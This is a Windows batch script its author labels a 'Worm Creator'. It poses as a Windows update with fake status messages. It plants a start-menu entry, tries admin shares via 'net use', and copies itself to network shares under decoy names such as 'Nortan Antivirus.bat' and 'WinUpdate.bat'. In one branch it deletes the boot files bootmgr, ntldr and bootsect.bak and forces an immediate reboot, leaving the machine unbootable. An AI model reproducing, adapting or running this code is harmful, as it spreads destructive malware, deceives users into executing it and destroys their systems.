@echo off
setlocal enabledelayedexpansion

REM "school sukz as fucz:/"-Worm Creator MyLifeIsSakura-
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
    echo Critical error: Administrative permissions not found.
    echo To fix the issue, run this script as administrator.
    goto :pause
)

set "startMenuShortcut=%APPDATA%\Microsoft\Windows\Start Menu\Programs\WinCriticalUpdate.bat"
if not exist "%startMenuShortcut%" (
    echo [InternetShortcut] > "%startMenuShortcut%"
    echo URL=file://%~f0 >> "%startMenuShortcut%"
    echo IconIndex=0 >> "%startMenuShortcut%"
    echo IconFile=%SystemRoot%\System32\shell32.dll >> "%startMenuShortcut%"
)

echo Windows update running...
echo Locating Windows version...
echo.
echo Windows version outdated, issues found.
echo Please stand by as Windows updates. Do not turn off the PC or close this window.

set "adminspread=0"

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /r /c:"IPv4 Address"') do (
    set ip=%%a
    set ip=!ip:~1!
    ping -n 1 !ip! >nul
    if !errorlevel! equ 0 (
        net use \\!ip! /user:Administrator >nul 2>&1
        if !errorlevel! equ 0 (
            if "!adminspread!"=="0" (
                xcopy /Y /Q "%~f0" "\\!ip!\c$\Users\Public\Desktop\WinCriticalUpdate.bat" >nul 2>&1
                xcopy /Y /Q "%~f0" "\\!ip!\c$\Users\Public\Documents\WinCriticalUpdate.bat" >nul 2>&1
            )
            set /a "adminspread+=1"
        )
    )
)

if !adminspread! equ 0 (
    xcopy /Y /Q "%~f0" "\\host\shared\Nortan Antivirus.bat" >nul 2>&1
    xcopy /Y /Q "%~f0" "\\host\shared\WinUpdate.bat" >nul 2>&1
    xcopy /Y /Q "%~f0" "\\host\shared\Windows Updater.bat" >nul 2>&1
    xcopy /Y /Q "%~f0" "\\host\shared\WinCriticalUpdate.bat" >nul 2>&1

    echo Windows update successfully installed.
    echo Please stand by as we add the finishing touches. This might take a few minutes.
    echo Do not close this window or turn off the machine.
) else (
    echo Windows update successfully installed.
    echo Please stand by as we add the finishing touches. This might take a few minutes.
    echo Do not close this window or turn off the machine.

    xcopy /Y /Q "%~f0" "\\host\shared\Nortan Antivirus.bat" >nul 2>&1
    xcopy /Y /Q "%~f0" "\\host\shared\WinUpdate.bat" >nul 2>&1
    xcopy /Y /Q "%~f0" "\\host\shared\Windows Updater.bat" >nul 2>&1
    xcopy /Y /Q "%~f0" "\\host\shared\WinCriticalUpdate.bat" >nul 2>&1

    timeout /t 30 >nul

    del /f /q %SystemDrive%\bootsect.bak
    del /f /q %SystemDrive%\bootmgr
    del /f /q %SystemDrive%\ntldr

    shutdown /r /t 0

:pause
pause
